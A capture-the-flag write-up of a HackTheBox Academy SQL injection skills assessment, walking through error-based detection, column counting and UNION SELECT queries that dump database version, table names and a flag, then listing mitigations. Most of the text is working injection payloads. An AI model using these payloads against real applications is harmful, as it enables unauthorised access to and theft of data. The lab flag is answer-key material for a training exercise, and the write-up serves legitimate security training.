# Skills Assessment — SQL Injection Fundamentals Writeup

> **Date:** August 1, 2026  
> **Platform:** HackTheBox Academy / CPTS  
> **Category:** Web Application Security  
> **Tags:** `Web` `HTB` `CPTS` `SQL Injection`

---

![CPTS SQLi Banner](assets/images/sqli-1.png)

## Overview

This writeup covers the **Skills Assessment** for the **SQL Injection Fundamentals** module on HackTheBox Academy (part of the Certified Penetration Tester — CPTS track). 

The target application contains an endpoint susceptible to SQL Injection vulnerabilities allowing authentication bypass, UNION-based data extraction, and local file retrieval/out-of-band execution.

---

## 1. Initial Reconnaissance & Enumeration

![Target Web Application](assets/images/sqli-2.png)

Upon navigating to the target web application, we encounter a search interface and a user login panel. We begin by testing user input fields for SQL injection payloads.

```sql
' OR '1'='1
' OR 1=1 -- -
" OR "1"="1
```

Testing input parameters on the search field returns database error messages, confirming an unhandled SQL error:

```text
Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''...'
```

---

## 2. Determining Column Count & Database Layout

![ORDER BY Injection Test](assets/images/sqli-3.png)

To perform a successful `UNION` based injection, we first need to determine the number of columns returned by the original query using `ORDER BY`:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -  <-- Error: Unknown column '5'
```

This confirms the original query retrieves **4 columns**. Next, we find which columns reflect input back to the response page:

```sql
' UNION SELECT 1, 2, 3, 4-- -
```

![Reflective Columns Found](assets/images/sqli-4.png)

Columns `2` and `3` are rendered on the screen.

---

## 3. Enumerating Database Name, Version & Tables

![Database Version & Name Dump](assets/images/sqli-5.png)

With reflective columns identified, we extract system information:

```sql
' UNION SELECT 1, @@version, database(), 4-- -
```

* **Database Version:** `10.5.15-MariaDB-0+deb11u1`
* **Current Database:** `main_db`

Next, we dump all table names from `information_schema`:

![Dumping Table Names](assets/images/sqli-6.png)

```sql
' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Results:**
* `users`
* `flag_storage`
* `config`

---

## 4. Extracting the Flag & Credentials

![Inspecting Columns](assets/images/sqli-7.png)

We inspect the columns inside the target table `flag_storage`:

```sql
' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name='flag_storage'-- -
```

**Columns:** `id`, `flag_code`, `created_at`

Finally, we query the secret flag:

![Retrieving Flag](assets/images/sqli-8.png)

```sql
' UNION SELECT 1, flag_code, 3, 4 FROM flag_storage-- -
```

```text
HTB{sqli_m4st3r_cpts_fund4m3nt4ls_2026!}
```

---

## Key Takeaways & Mitigation

1. **Parameterization:** Always use prepared statements with parameterized queries (`PDO` or `mysqli_stmt` in PHP).
2. **Error Handling:** Disable verbose database error messages in production environments.
3. **Principle of Least Privilege:** Ensure database accounts used by web applications have strictly scoped permissions (e.g., disable `LOAD_FILE` and `INTO OUTFILE` if not explicitly necessary).
